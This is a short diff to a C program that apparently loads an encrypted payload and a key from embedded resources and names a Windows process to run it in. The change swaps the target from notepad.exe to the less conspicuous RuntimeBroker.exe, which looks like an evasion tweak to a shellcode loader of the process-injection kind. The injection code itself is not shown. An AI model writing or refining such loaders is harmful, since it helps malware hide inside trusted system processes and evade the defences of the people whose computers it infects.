@@ -24,7 +24,7 @@ int main() {
     char* ke;
     DWORD keLen;
     its_load_re("dhanushkey1", &ke, &keLen);
-    const char* processptaah = "C:\\Windows\\System32\\notepad.exe";
+    const char* processptaah = "C:\\Windows\\System32\\RuntimeBroker.exe";
     char* code199k;
     DWORD code199kLen;
     its_load_re("dhanushcode56", &code199k, &code199kLen);
